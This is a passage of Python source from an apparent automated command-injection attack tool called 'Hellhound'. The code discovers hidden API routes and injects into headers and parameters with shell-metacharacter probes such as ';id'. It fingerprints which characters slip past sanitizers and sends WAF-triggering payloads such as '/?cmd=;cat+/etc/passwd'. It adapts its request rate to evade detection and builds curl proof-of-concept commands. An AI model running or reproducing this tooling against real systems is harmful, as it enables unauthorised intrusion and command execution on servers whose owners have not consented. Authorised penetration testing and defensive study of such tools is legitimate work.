                        # Normalise: strip query string, keep path only
                        p = urllib.parse.urlparse(val).path
                        if p:
                            found_paths.add(p)

                # sitemap.xml: extract <loc> tags
                for m in re.finditer(r"<loc>\s*(https?://[^\s<]+)\s*</loc>", body, re.I):
                    loc_url = m.group(1).strip()
                    if self._same_domain(loc_url):
                        p = urllib.parse.urlparse(loc_url).path
                        if p and p != "/":
                            found_paths.add(p)
                    elif "sitemap" in loc_url.lower():
                        found_paths.update(self._parse_sitemap(loc_url))

                # security.txt: extract Contact: and any URL hints
                for m in re.finditer(r"(?:Contact|Canonical|Policy):\s*(https?://\S+)", body, re.I):
                    c_url = m.group(1).strip()
                    if self._same_domain(c_url):
                        p = urllib.parse.urlparse(c_url).path
                        if p and p != "/":
                            found_paths.add(p)

                # Generic JSON config responses — scan string values for paths
                if "json" in r.get("headers", {}).get("content-type", ""):
                    for m in re.finditer(r'"(/(?:api|v\d+|admin|internal|mgmt)[^"]{0,80})"', body):
                        p = m.group(1)
                        if p and not p.endswith((".js", ".css", ".png", ".jpg")):
                            found_paths.add(p)

            except Exception:
                continue

        # Filter noise: no static assets, no bare /, no external paths
        _STATIC = re.compile(r'\.(js|css|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|map|pdf|zip)$', re.I)
        return [p for p in found_paths
                if not _STATIC.search(p) and len(p) > 1 and p.startswith("/")]

    def _parse_sitemap(self, sitemap_url):
        """Fetch a sitemap URL and extract all <loc> paths on this domain."""
        paths = set()
        try:
            r = self.client.get(sitemap_url)
            if r["status"] != 200:
                return paths
            for m in re.finditer(r"<loc>\s*(https?://[^\s<]+)\s*</loc>", r["body"], re.I):
                loc = m.group(1).strip()
                if self._same_domain(loc):
                    p = urllib.parse.urlparse(loc).path
                    if p and p != "/":
                        paths.add(p)
        except Exception:
            pass
        return paths

    def _extract_obfuscated_api_paths(self):
        """
        Scan all visited page bodies and cached JS content for path strings that
        look like obfuscated / hashed API routes:
          /api/a3f9b2c1
          /api/v2/3d8f1a29e4c7
          /service/abc123def456
          /internal/0f3e9a1b2c4d5e6f (16+ hex chars = UUID fragment)
        These are never linked in HTML so the crawler misses them.
        Returns a deduplicated list of candidate paths.
        """
        # Pattern: /<known-api-prefix>/<segment of 6-40 alphanum/hex chars>
        # that doesn't look like a normal English word
        # Match hex-hash API paths: /api/<8-40 hex chars>
        _OBF_RE = re.compile(
            r"/(?:api|v[0-9]+|internal|service|mgmt|admin|rpc|graphql|rest)"
            r"(?:/[a-zA-Z0-9_%-]{1,30}){0,2}"
            r"/([a-f0-9]{8,40})"
            r"(?:/[a-zA-Z0-9_-]{0,30})?",
            re.I
        )
        # UUID-format paths: /api/550e8400-e29b-41d4-a716-446655440000
        _UUID_RE = re.compile(
            r"(?:/[a-zA-Z0-9_-]{1,30}){1,3}"
            r"/([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})",
            re.I
        )
        # Change 4a: Alphanumeric slugs — 5-12 chars with mixed alpha+digit
        _SLUG_RE = re.compile(
            r"/(?:api|v[0-9]+|internal|service|mgmt|admin|rpc|rest|app)"
            r"(?:/[a-zA-Z0-9_-]{1,20}){0,2}"
            r"/([a-zA-Z0-9]{5,12})"
            r"(?:[/?#]|$)",
            re.I
        )
        # Change 4b: Vowel-sparse slugs — 4-12 chars, ≤1 vowel, has digit
        _VOWSPARSE_RE = re.compile(
            r"/(?:api|v[0-9]+|internal|service|mgmt|admin|rpc|rest)"
            r"/([a-zA-Z0-9]{4,12})"
            r"(?:[/?#]|$)",
            re.I
        )
        # Bare top-level slugs: /q3h5tp, /a8r2tj — no api/ prefix required.
        # Must be vowel-sparse (≤1 vowel) AND contain at least one digit to
        # avoid matching real English paths like /login, /about, /help.
        _BARE_SLUG_RE = re.compile(
            r"(?:^|[\s\"'])(/[a-zA-Z0-9]{4,12})(?:[/?#\"'\s]|$)"
        )
        _VOWELS = set('aeiouAEIOU')

        def _is_obf_slug(seg):
            has_alpha   = any(c.isalpha() for c in seg)
            has_digit   = any(c.isdigit() for c in seg)
            vowel_count = sum(1 for c in seg if c in _VOWELS)
            if not (has_alpha and has_digit):
                return False
            return vowel_count <= 1

        # Use the body cache populated during crawl — no re-fetching needed.
        # All page and JS bodies were stored in self._body_cache as they were visited.
        found_paths = set()
        with self._ep_lock:
            cache_snapshot = dict(self._body_cache)

        def _scan_body_for_obf(body):
            if not body:
                return
            for pat in (_OBF_RE, _UUID_RE):
                for m in pat.finditer(body):
                    full_match = m.group(0)
                    p = full_match if full_match.startswith("/") else "/" + full_match
                    p = p.split("?")[0].strip().rstrip("/")
                    if p and len(p) > 4:
                        found_paths.add(p)
            # Change 4a+4b: slug and vowel-sparse patterns
            for m in _SLUG_RE.finditer(body):
                seg = m.group(1)
                if _is_obf_slug(seg):
                    full_match = m.group(0).rstrip("/?#")
                    p = full_match if full_match.startswith("/") else "/" + full_match
                    p = p.split("?")[0].strip().rstrip("/")
                    if p and len(p) > 3:
                        found_paths.add(p)
            for m in _VOWSPARSE_RE.finditer(body):
                seg = m.group(1)
                if _is_obf_slug(seg):
                    full_match = m.group(0).rstrip("/?#")
                    p = full_match if full_match.startswith("/") else "/" + full_match
                    p = p.split("?")[0].strip().rstrip("/")
                    if p and len(p) > 3:
                        found_paths.add(p)
            # Bare top-level slugs: /q3h5tp style — no prefix required
            for m in _BARE_SLUG_RE.finditer(body):
                seg = m.group(1).lstrip("/")
                if _is_obf_slug(seg):
                    p = m.group(1).split("?")[0].strip().rstrip("/")
                    if p and len(p) > 3:
                        found_paths.add(p)

        for _url, body in cache_snapshot.items():
            _scan_body_for_obf(body)

        # Change 4: also scan JSON bodies collected during chained discovery
        for _url, body in getattr(self, '_json_response_cache', {}).items():
            _scan_body_for_obf(body)

        _STATIC = re.compile(r'\.(js|css|png|jpg|gif|svg|ico|woff|map)$', re.I)
        return [p for p in found_paths if not _STATIC.search(p)]


    def _chase_json_response(self, body, source_url=""):
        """
        Upgrade 1: When a discovered endpoint returns JSON, recursively extract
        every string value that looks like an internal path.
        Catches full route maps exposed by config/info/health endpoints.
        Returns a set of path strings.
        """
        found = set()
        _STATIC = re.compile(
            r'\.(js|css|png|jpg|gif|svg|ico|woff|map|pdf|zip|ttf)$', re.I)
        try:
            import json as _json
            # Try JSON parse first
            data = _json.loads(body)
            def _walk(node):
                if isinstance(node, dict):
                    for v in node.values():
                        _walk(v)
                elif isinstance(node, list):
                    for item in node:
                        _walk(item)
                elif isinstance(node, str):
                    # Any string starting with / that looks like a path
                    val = node.strip()
                    if (val.startswith("/") and len(val) > 1 and len(val) < 150
                            and not _STATIC.search(val)
                            and not val.startswith("//")  # protocol-relative URL
                            and " " not in val):
                        found.add(val.split("?")[0].rstrip("/") or "/")
            _walk(data)
        except Exception:
            # Fallback: regex scan for any "/" string in the body
            for m in re.finditer(r'"(/[a-zA-Z0-9_/\-]{1,120})"', body):
                p = m.group(1)
                if not _STATIC.search(p) and len(p) > 1:
                    found.add(p)
        return found

    def _chase_html_for_api_calls(self, body, page_url=""):
        """
        Upgrade 2: When a discovered path returns HTML (not JSON), run JSExtractor
        on the full body to find fetch()/axios/XHR/router calls embedded in it.
        Also scan for string literals matching /api/... /v1/... patterns.
        Returns a set of path strings.
        """
        found = set()
        try:
            eps, _ = self._js_extractor.extract(body, page_url or self.base)
            for ep in eps:
                p = ep["path"]
                if p and p.startswith("/") and len(p) > 1:
                    found.add(p.split("?")[0].rstrip("/") or "/")
        except Exception:
            pass
        # API-prefix string literals: "/api/something", '/v1/something' etc.
        # Only paths with a known backend prefix — not content navigation.
        for m in re.finditer(
                r"""["\'](/(?:api|v\d+|internal|admin|mgmt|service|rpc|graphql|rest)"""
                r"""[a-zA-Z0-9_/\-]{0,80})["\'""" + "]",
                body):
            p = m.group(1)
            if p and len(p) > 2:
                found.add(p.split("?")[0])
        # href= extraction intentionally omitted: navigation links between
        # content pages are not injection surfaces.  The JSExtractor pass
        # above already finds fetch()/axios/XHR calls in embedded scripts,
        # and the string literal regex above catches API path references.
        return found

    def _parse_openapi_routes(self, body):
        """
        Upgrade 3a: Parse swagger.json / openapi.json and extract every path
        key from the "paths" object. These are the definitive route maps —
        one fetch gives the entire API surface.
        Returns a set of path strings.
        """
        found = set()
        try:
            import json as _json
            data = _json.loads(body)
            # OpenAPI 2 / 3 both use a top-level "paths" key
            paths_obj = data.get("paths", {})
            if isinstance(paths_obj, dict):
                for path_key in paths_obj.keys():
                    p = str(path_key).strip()
                    # OpenAPI paths use {param} placeholders — keep as-is for probing
                    if p.startswith("/") and len(p) > 1:
                        # Strip {param} segments for probing, keep raw for param extraction
                        clean = re.sub(r"\{[^}]+\}", "test", p)
                        found.add(clean.rstrip("/") or "/")
        except Exception:
            # Not valid JSON — try regex for "paths" key in partial/malformed responses
            for m in re.finditer(r'"/([a-zA-Z0-9_/\-]{1,80})"', body):
                p = "/" + m.group(1)
                if len(p) > 2:
                    found.add(p)
        return found

    def _header_injection_endpoints(self):
        """
        Build synthetic injection endpoints for HTTP header surfaces.
        Spec §1.4: agents that only fuzz query params miss the majority of
        real-world injection points.  Headers commonly used as injection vectors:
          X-Forwarded-For, X-Real-IP, Referer, User-Agent, X-Custom-*
        Each is represented as a param with source='header_inject'.
        Injector._send detects this source and injects into request headers
        rather than the query string.
        """
        # Only add header injection for the base URL to avoid duplicating
        # for every crawled page — header injection is server-wide
        injectable_headers = {
            "X-Forwarded-For": "127.0.0.1",
            "X-Real-IP":       "127.0.0.1",
            "Referer":         "http://localhost/",
            "User-Agent":      "Mozilla/5.0",
            "X-Originating-IP":"127.0.0.1",
            "X-Remote-IP":     "127.0.0.1",
            "X-Client-IP":     "127.0.0.1",
            "X-Host":          "localhost",
            "X-Custom-Header": "test",
        }
        # Group all injectable headers into one synthetic endpoint so Injector
        # tests each header param individually (one param = one header)
        return [{
            "url":    self.base,
            "method": "GET",
            "params": injectable_headers,
        }]

    def _detect_sanitization_endpoints(self, extra_endpoints=None, force_all=False):
        """
        Spec §2.4: probe endpoints for host_raw != host_sanitized discrepancy
        in JSON responses.  If the app sanitizes the value and reflects both
        forms, we know it pre-processes before shell — flag for evasion escalation.

        Change 5:
          - force_all=True: run on ALL provided endpoints, no URL-pattern filter.
            Used for chained_path_d* and discovery_file endpoints (higher-confidence
            injection surfaces found via JSON chaining).
          - force_all=False (default): apply _UTIL_RE filter to reduce load during
            initial crawl phase (original behaviour preserved).
          - extra_endpoints: list of additional endpoints to scan (e.g. newly
            added chained paths). Merged with self.endpoints before filtering.
        """
        flagged = []
        _UTIL_RE = re.compile(r'/(?:ping|exec|cmd|run|tool|diag|debug|lookup|resolve|trace|net|dns|system|query)', re.I)
        all_eps = list(self.endpoints) + (extra_endpoints or [])
        if force_all:
            candidates = all_eps[:40]  # generous cap — chained paths are high-value
        else:
            candidates = [e for e in all_eps if _UTIL_RE.search(e["url"])][:20]
        # Param-aware probe value selector.
        # The safe prefix is chosen to match the expected input type of the param
        # so the app processes it normally and reflects it — then we look for
        # whether the shell metachar was stripped from the reflected value.
        _IP_PARAMS    = re.compile(r'^(?:host|ip|addr|address|target|hostname|dst|src|remote|server)$', re.I)
        _PATH_PARAMS  = re.compile(r'^(?:path|file|dir|folder|filename|filepath|location)$', re.I)
        _NUM_PARAMS   = re.compile(r'^(?:port|timeout|delay|count|limit|size|num|id|pid)$', re.I)

        def _make_probe(pname):
            """Return (probe_val, safe_prefix) for a given param name."""
            if _IP_PARAMS.search(pname):
                return "127.0.0.1;id", "127.0.0.1"
            if _PATH_PARAMS.search(pname):
                return "/tmp/hellhound_probe;id", "/tmp/hellhound_probe"
            if _NUM_PARAMS.search(pname):
                return None, None  # skip — numeric params don't reach shell
            # Generic: use a recognisable random-ish string so partial reflection
            # is unambiguous and won't collide with existing page content.
            return "hellhound_san_probe;id", "hellhound_san_probe"

        for ep in candidates:
            for param in list(ep["params"].keys()):
                _pv, _safe_prefix = _make_probe(param)
                if _pv is None:
                    continue  # numeric param — skip
                probe_val = _pv
                try:
                    if ep["method"] == "GET":
                        r = self.client.get(ep["url"], {**ep["params"], param: probe_val})
                    else:
                        r = self.client.post(ep["url"], {**ep["params"], param: probe_val})
                    body = r.get("body", "")
                    ct   = r.get("headers", {}).get("content-type", "").lower()
                    # Gate: only proceed when the response is JSON and non-trivial.
                    # text/html, text/plain, error pages and static files cannot
                    # reflect sanitized input in a structured way — skip them.
                    if "application/json" not in ct and not (
                            body.lstrip().startswith(("{", "["))
                            and len(body) >= 50):
                        continue
                    if not body or len(body) < 50:
                        continue
                    # Detect sanitization: raw input and sanitized version both in JSON
                    try:
                        import json as _json
                        data = _json.loads(body)
                        def _flat(d, prefix=""):
                            if isinstance(d, dict):
                                for k, v in d.items():
                                    yield from _flat(v, f"{prefix}.{k}" if prefix else k)
                            elif isinstance(d, list):
                                for item in d:
                                    yield from _flat(item, prefix)
                            else:
                                yield prefix, str(d)
                        vals = dict(_flat(data))
                        raw_keys = [k for k, v in vals.items() if probe_val in v]
                        # Sanitized: contains the safe prefix but NOT the shell metachar.
                        # Using _safe_prefix (not hardcoded IP) so this works for
                        # any param type on any website.
                        san_keys = [k for k, v in vals.items()
                                    if _safe_prefix in v and probe_val not in v
                                    and ";id" not in v]
                        if raw_keys and san_keys:
                            # Char-survival fingerprint: probe each dangerous char
                            # individually to find which ones survive the filter.
                            # Only chars in survived_chars will be used in Tier 5.
                            _CHAR_PROBES = [
                                (";",      "test;x"),
                                ("|",      "test|x"),
                                ("&&",     "test&&x"),
                                ("\n",    "test%0ax"),
                                ("\t",    "test\tx"),
                                ("${IFS}", "test${IFS}x"),
                            ]
                            survived = set()
                            for char_token, char_val in _CHAR_PROBES:
                                try:
                                    if ep["method"] == "GET":
                                        cr = self.client.get(
                                            ep["url"], {**ep["params"], param: char_val})
                                    else:
                                        cr = self.client.post(
                                            ep["url"], {**ep["params"], param: char_val})
                                    cbody = cr.get("body", "")
                                    try:
                                        cdata = _json.loads(cbody)
                                        cvals = dict(_flat(cdata))
                                        # Survived if the char appears in any sanitized value
                                        for _, cv in cvals.items():
                                            if char_token in cv:
                                                survived.add(char_token)
                                                break
                                    except Exception:
                                        if char_token in cbody:
                                            survived.add(char_token)
                                except Exception:
                                    pass
                            flagged.append({
                                "url": ep["url"],
                                "method": ep["method"],
                                "params": {param: probe_val},
                                "survived_chars": survived,
                                "param": param,
                            })
                    except Exception:
                        # Not JSON — check plain text for sanitization hints.
                        # Safe prefix present but shell metachar stripped = sanitized.
                        if _safe_prefix in body and ";id" not in body:
                            flagged.append({
                                "url": ep["url"],
                                "method": ep["method"],
                                "params": {param: probe_val},
                                "survived_chars": set(),
                                "param": param,
                            })
                except Exception:
                    continue
        return flagged

# ─────────────────────────────────────────────────────────────────────────────
# OS FINGERPRINTER
# ─────────────────────────────────────────────────────────────────────────────
# ─────────────────────────────────────────────────────────────────────────────
# WAF DETECTOR  (Inst 7)
# ─────────────────────────────────────────────────────────────────────────────
class WAFDetector:
    """
    Inst 7 — WAF Detection and Stealth Mode.
    Sends known WAF-triggering payloads and analyses:
      - Status codes 403, 406, 429, 503
      - Response body signatures for major WAF vendors
      - Abnormal response time increases vs baseline
    If WAF detected: identifies type, recommends delay, signals evasion mode.
    """
    _WAF_SIGS = [
        (re.compile(r'cloudflare', re.I),              "Cloudflare"),
        (re.compile(r'x-sucuri-id|sucuri', re.I),      "Sucuri"),
        (re.compile(r'akamai', re.I),                  "Akamai"),
        (re.compile(r'mod_security|modsecurity', re.I),"ModSecurity"),
        # FIX WAF-1: Original r'f5|big.?ip' matched hex colors (#f5f5f5),
        # CSS classes, and any two-char sequence "f5" in any response body.
        # Tightened to word-bounded tokens + header-specific checks.
        (re.compile(r'\bBigIP\b|\bBIG-IP\b|X-Cnection|F5-TrafficShield|'
                    r'BigIpServer|x-wa-info.*f5|TS[0-9a-f]{8}', re.I), "F5 BIG-IP"),
        (re.compile(r'incapsula|imperva', re.I),       "Imperva"),
        (re.compile(r'aws waf|awswaf', re.I),          "AWS WAF"),
        (re.compile(r'barracuda', re.I),               "Barracuda"),
        (re.compile(r'wordfence', re.I),               "Wordfence"),
        (re.compile(r'request.*blocked|blocked.*request|'
                    r'access.*denied|security.*violation|'
                    r'forbidden.*waf|illegal.*request', re.I), "Generic WAF"),
    ]
    _TRIGGER_PAYLOADS = [
        "/?test=;id",
        "/?cmd=;cat+/etc/passwd",
        "/?id=1 UNION SELECT 1,2,3--",
        "/?q=../../etc/passwd",
    ]

    def __init__(self, target_url, client, delay=0):
        self.url    = target_url.rstrip("/")
        self.client = client
        self.delay  = delay

    def detect(self):
        section("PHASE 2b/4 — WAF DETECTION")
        tprint(f"  {color('─'*68, C.DIM)}")

        # Baseline: clean request timing
        try:
            _b = self.client.get(self.url)
            baseline_time = _b.get("elapsed", 0.5)
        except Exception:
            baseline_time = 0.5

        detected   = False
        waf_type   = "unknown"
        block_codes = {403, 406, 429, 503}

        for probe_path in self._TRIGGER_PAYLOADS:
            probe_url = self.url + probe_path
            try:
                r = self.client.get(probe_url)
                st   = r.get("status", 0)
                body = r.get("body", "") or ""
                hdrs = r.get("headers", {})
                el   = r.get("elapsed", 0.0)

                # Check status code
                if st in block_codes:
                    detected = True

                # Check body/header signatures
                for sig_re, name in self._WAF_SIGS:
                    combined = body[:3000] + " ".join(
                        f"{k}: {v}" for k, v in hdrs.items())
                    if sig_re.search(combined):
                        detected = True
                        waf_type = name
                        break

                # Check timing anomaly (>4× baseline = WAF rate-limit)
                if el > baseline_time * 4 and el > 3.0:
                    detected = True

                if detected:
                    break
            except Exception:
                pass

        if detected:
            recommended_delay = max(self.delay, 1.5)
            tprint(f"  {warn(f'WAF identified: {color(waf_type, C.BYELLOW, C.BOLD)}')}")
            tprint(f"  {info(f'Recommended delay: {recommended_delay}s between requests')}")
        else:
            tprint(f"  {ok('No WAF detected — proceeding at full speed')}")
            recommended_delay = self.delay

        return {
            "detected":           detected,
            "waf_type":           waf_type,
            "recommended_delay":  recommended_delay,
        }


class OSFingerprinter:
    def __init__(self, base_url, client):
        self.url = base_url
        self.client = client

    def fingerprint(self):
        tprint(f"\n  {phase('2/4')} {color('OS FINGERPRINTING', C.BOLD + C.BWHITE)}")
        tprint(f"  {color('─'*68, C.DIM)}")

        score = {"linux": 0, "windows": 0}
        evidence = []
        resp = self.client.get(self.url)
        hdrs = resp.get("headers", {})
        body = resp.get("body", "").lower()

        server = hdrs.get("server", "").lower()
        if any(x in server for x in ["apache", "nginx", "lighttpd"]):
            score["linux"] += 3; evidence.append(f"Server: {hdrs.get('server','')}")
        elif any(x in server for x in ["iis", "microsoft-httpapi"]):
            score["windows"] += 3; evidence.append(f"Server: {hdrs.get('server','')}")

        xpb = hdrs.get("x-powered-by", "").lower()
        if any(x in xpb for x in ["php", "python", "ruby", "perl"]):
            score["linux"] += 1; evidence.append(f"X-Powered-By: {hdrs.get('x-powered-by','')}")
        elif any(x in xpb for x in ["asp.net", "mono"]):
            score["windows"] += 2; evidence.append(f"X-Powered-By: {hdrs.get('x-powered-by','')}")

        cookie = hdrs.get("set-cookie", "").lower()
        if "asp.net_sessionid" in cookie or "aspxauth" in cookie:
            score["windows"] += 2; evidence.append("ASP.NET session cookie")
        if "phpsessid" in cookie:
            score["linux"] += 1; evidence.append("PHPSESSID cookie")

        for sig, os_t, pts in [
            (r"windows server 20\d\d", "windows", 3),
            (r"microsoft-iis",          "windows", 2),
            (r"ubuntu|debian|centos|rhel|fedora|alpine", "linux", 2),
            (r"apache/\d",             "linux",   1),
            (r"php/\d",                "linux",   1),
        ]:
            if re.search(sig, body):
                score[os_t] += pts; evidence.append(f"Body: {sig}")

        if score["linux"] == score["windows"] == 0:
            result, confidence = "linux", "low"
        else:
            result = "linux" if score["linux"] >= score["windows"] else "windows"
            total = score["linux"] + score["windows"]
            pct = max(score["linux"], score["windows"]) / total * 100
            confidence = "high" if pct >= 75 else "medium"

        sc_l = score["linux"]
        sc_w = score["windows"]
        tprint(f"  {info(f'Linux score: {sc_l}  |  Windows score: {sc_w}')}")
        for e in evidence[:4]:
            tprint(f"  {color('  ↳', C.DIM)} {color(e, C.BWHITE)}")
        tprint(f"  {ok(f'OS: {result.upper()} (confidence: {confidence})')}")

        run_both = (score["linux"] == score["windows"] == 0)
        return result, run_both

# ─────────────────────────────────────────────────────────────────────────────
# PARAMETER RISK SCORER
# ─────────────────────────────────────────────────────────────────────────────
_HIGH_RISK = re.compile(
    r"cmd|command|exec|execute|run|shell|ping|host|hostname|ip|addr|address|"
    r"file|path|dir|folder|input|arg|argument|src|source|dest|target|"
    r"query|search|proc|process|output|debug|log|system", re.I
)
_MED_RISK = re.compile(
    r"name|value|text|msg|message|url|uri|data|param|result|to|from", re.I
)

def risk_score(name):
    if _HIGH_RISK.search(name): return 2
    if _MED_RISK.search(name):  return 1
    return 0

# URL pattern that signals a backend execution endpoint (not a UI page)
_BACKEND_URL_RE = re.compile(
    r'/(?:api|v[0-9]+|admin|cmd|exec|run|debug|ping|tool|tools|'
    r'util|utils|internal|shell|console|mgmt|management|proxy|'
    r'diagnostic|diag|query|proc|process|lookup|resolve|dns|net|'
    r'network|health|monitor|trace|traceroute|nslookup|export|'
    r'import|webhook|eval|repl|helper|system)',
    re.I
)

def prioritize_endpoints(eps):
    def score(ep):
        # source is always a string in Hellhound's internal schema.
        # Guard against stray lists from any import path.
        src = ep.get("source", "") or ""
        if isinstance(src, list):
            src = src[0] if src else ""
        src = str(src)
        url = ep.get("url", "")

        # Hard floor: header injection is last-resort, always at the bottom.
        if src == "header_inject":
            return -999

        # ── Source bonuses (confirmed / high-confidence surfaces) ───────────
        # Ordered from highest to lowest confidence:
        #   sanitization_detect → confirmed input reaches shell (+6)
        #   chained_path_d1     → 1 hop from a debug/config endpoint (+5)
        #   obf_api_probe       → deliberately hidden slug, high value (+4)
        #   chained_path_d2     → 2 hops deep (+4)
        #   chained_path_d3     → 3 hops deep (+3)
        #   discovery_file      → found in robots.txt / sitemap (+2)
        #   zero_param_probe    → endpoint found via zero-param discovery (+3)
        _SOURCE_BONUS = {
            "sanitization_detect": +6,
            "chained_path_d1":     +5,
            "obf_api_probe":       +4,
            "chained_path_d2":     +4,
            "chained_path_d3":     +3,
            "zero_param_probe":    +3,
            "discovery_file":      +2,
        }
        src_bonus = _SOURCE_BONUS.get(src, 0)

        # ── Source penalties (low-confidence surfaces) ───────────────────────
        # HTML forms almost never contain CMDi — auth, registration, search etc.
        src_penalty = -5 if src.startswith("form@") else 0

        # ── URL pattern penalty: no backend segment → likely a UI page ───────
        # Only applied to generic crawl sources, NOT to chained/sanitization
        # sources which are trusted regardless of URL appearance.
        _trusted_src = src.startswith(("chained_path", "sanitization_detect",
                                        "obf_api_probe", "discovery_file",
                                        "path_probe", "zero_param_probe"))
        url_penalty = 0
        if not _trusted_src and not _BACKEND_URL_RE.search(url):
            url_penalty = -3

        # ── Param risk score ─────────────────────────────────────────────────
        _confirmed = set(ep.get("priority_params") or [])
        _guessed   = set(ep["params"].keys()) - _confirmed
        param_score = 0
        for _p in _confirmed:
            _rs = risk_score(_p)
            param_score += 6 if _rs >= 2 else (3 if _rs == 1 else 0)
        for _p in _guessed:
            _rs = risk_score(_p)
            param_score += 1 if _rs >= 2 else 0

        # ── Response-size signal ─────────────────────────────────────────────
        # Small JSON responses (< 300 bytes) often indicate a functional API
        # endpoint returning structured data — high likelihood of param sensitivity.
        # Very large responses (> 50 KB) are more likely static pages.
        _resp_sig = ep.get("response_sig") or ""
        _resp_size = 0
        if _resp_sig and ":" in _resp_sig:
            try:
                _resp_size = int(_resp_sig.split(":")[-1])
            except Exception:
                pass
        _size_bonus = 0
        if 0 < _resp_size < 300:
            _size_bonus = +2   # tiny JSON — highly responsive endpoint
        elif _resp_size > 51200:
            _size_bonus = -1   # large static page — deprioritise slightly

        # ── Sink hint bonus ─────────────────────────────────────────────────
        # If the baseline body already revealed a shell-execution hint, this
        # endpoint is extremely high value.
        _sink_bonus = +4 if ep.get("sink_hint") else 0

        method_mult = 2 if ep["method"] == "POST" else 1
        return (param_score * method_mult
                + src_bonus + src_penalty + url_penalty
                + _size_bonus + _sink_bonus)
    return sorted(eps, key=score, reverse=True)
    return sorted(eps, key=score, reverse=True)

# ─────────────────────────────────────────────────────────────────────────────
# POC LINK BUILDER
# ─────────────────────────────────────────────────────────────────────────────
def _strip_ansi(s):
    return re.sub(r'\x1b\[[0-9;]*m', '', str(s))

def _pad(text, width):
    visible_len = len(_strip_ansi(text))
    pad_needed = max(0, width - visible_len)
    return text + (" " * pad_needed)

def build_poc(finding):
    url         = finding["endpoint"]
    param       = finding["parameter"]
    payload     = finding["payload"]
    method      = finding["method"]
    base_params = finding.get("base_params", {})
    hidden      = finding.get("hidden_params", {})
    is_wv       = finding.get("is_wv_mode", False)

    all_params = {
        k: v for k, v in {**hidden, **base_params}.items()
        if k == param or str(v) != _ZP_PROBE_SENTINEL
    }
    if param not in all_params:
        all_params[param] = "test"
    encoded = urllib.parse.quote(payload, safe="")

    # WV (whole-value) payloads REPLACE the param entirely — no 'test' prefix.
    # Append-mode payloads are injected after the existing value → 'test' prefix.
    prefix = "" if is_wv else "test"

    if method == "GET":
        qs_parts = []
        for k, v in all_params.items():
            if k == param:
                qs_parts.append(f"{urllib.parse.quote(k)}={prefix}{encoded}")
            else:
                qs_parts.append(f"{urllib.parse.quote(k)}={urllib.parse.quote(str(v))}")
        if param not in all_params:
            qs_parts.append(f"{urllib.parse.quote(param)}={prefix}{encoded}")
        qs = "&".join(qs_parts)
        browser_url = f"{url}?{qs}"
        curl_cmd = f'curl -sk "{browser_url}"'
        
    else:
            _ct = finding.get("content_type", "") or ""
            if "json" in _ct.lower():
                import json as _jcurl
                json_dict = {}
                for k, v in all_params.items():
                    if k == param:
                        json_dict[k] = f"{prefix}{payload}"
                    else:
                        v_clean = "test" if str(v) == _ZP_PROBE_SENTINEL else str(v)
                        json_dict[k] = v_clean
                if param not in all_params:
                    json_dict[param] = f"{prefix}{payload}"
                json_body = _jcurl.dumps(json_dict)
                browser_url = None
                curl_cmd = f'curl -sk -X POST "{url}" -H "Content-Type: application/json" -d \'{json_body}\''
            else:
                data_parts = []
                for k, v in all_params.items():
                    if k == param:
                        data_parts.append(f"{urllib.parse.quote(k)}={prefix}{encoded}")
                    else:
                        data_parts.append(f"{urllib.parse.quote(k)}={urllib.parse.quote(str(v))}")
                if param not in all_params:
                    data_parts.append(f"{urllib.parse.quote(param)}={prefix}{encoded}")
                data_str = "&".join(data_parts)
                browser_url = None
                curl_cmd = f'curl -sk -X POST "{url}" -d "{data_str}"'
    return {"browser_url": browser_url, "curl_cmd": curl_cmd}
# ─────────────────────────────────────────────────────────────────────────────
# PARAMETER TYPE FINGERPRINTING
#
# Before firing payloads, we probe a param with a non-numeric string.
# If the app returns a type-conversion error, the param expects an integer
# and shell injection cannot reach the OS — skip it to reduce noise.
#
# Also tracks param location: query-string vs POST body.  WAFs often apply
# different rule-sets per location, so bypass techniques are annotated.
# ─────────────────────────────────────────────────────────────────────────────
_INT_PARAM_NAMES = re.compile(
    r"^(?:id|pid|uid|gid|tid|oid|rid|age|num|count|limit|offset|page|size|"
    r"total|amount|qty|quantity|port|version|rev|revision|rank|index|seq|"
    r"order_id|user_id|product_id|item_id|cat_id|parent_id|node_id)$",
    re.I
)

def _looks_like_int_param(name: str, default_val: str) -> bool:
    """Return True if this param is likely to expect an integer value."""
    if _INT_PARAM_NAMES.match(name.strip()):
        return True
    # If the baseline value is already a bare integer, treat as int param
    if isinstance(default_val, str) and default_val.strip().lstrip("-").isdigit():
        return True
    return False

def _probe_param_type(client, endpoint: dict, param: str) -> str:
    """
    Fire a non-numeric string at a suspicious-int param.
    Returns 'integer' if the app raises a type error, 'string' otherwise.
    Uses a short-circuit: only probes params whose name or default value
    strongly suggest integer semantics.
    """
    default_val = endpoint["params"].get(param, "1")
    if not _looks_like_int_param(param, str(default_val)):
        return "string"

    probe_val = "notanint_probe"
    injected  = {**endpoint["params"], param: probe_val}
    try:
        if endpoint["method"] == "GET":
            resp = client.get(endpoint["url"], injected)
        else:
            resp = client.post(endpoint["url"],
                               {**endpoint.get("hidden", {}), **injected})
        body = resp.get("body", "")
        err  = AdaptiveBypass.classify_error(body)
        if err == "type_conversion":
            return "integer"
    except Exception:
        pass
    return "string"


def _detect_input_encoding(client, endpoint: dict, param: str) -> str:
    """
    Probe whether the endpoint pre-processes the parameter value before
    passing it to a shell — e.g. base64-decoding it first.

    Strategy:
      1. Send a valid base64 string that decodes to a recognisable token.
         If the server reflects or executes the decoded value, it pre-decodes.
      2. Send an *invalid* base64 string (odd padding, non-b64 chars).
         If the server returns a base64-specific error, it tried to decode.
      3. Send a JSON-encoded value — same idea for JSON pre-processing.

    Returns one of:
      'base64'  — endpoint likely base64-decodes the param before use
      'json'    — endpoint likely JSON-decodes the param before use
      'url'     — endpoint URL-decodes the param an extra time
      'none'    — no pre-processing detected (default injection path)

    This is a best-effort heuristic; false negatives are common.
    When 'base64' is detected, WV (whole-value) b64 payloads are tried
    first instead of last in the adaptive tier.
    """
    import base64 as _b64

    default_val = endpoint["params"].get(param, "test")

    # ── Test 1: invalid base64 → does server complain about b64 format? ──
    # Use a string with illegal b64 chars to provoke a decode error
    bad_b64 = "!!!NOT_VALID_BASE64!!!"
    injected_bad = {**endpoint["params"], param: bad_b64}
    try:
        if endpoint["method"] == "GET":
            resp_bad = client.get(endpoint["url"], injected_bad)
        else:
            resp_bad = client.post(endpoint["url"],
                                   {**endpoint.get("hidden", {}), **injected_bad})
        body_bad = resp_bad.get("body", "")
        # Check for base64-decode error signals in response
        err_class = AdaptiveBypass.classify_error(body_bad)
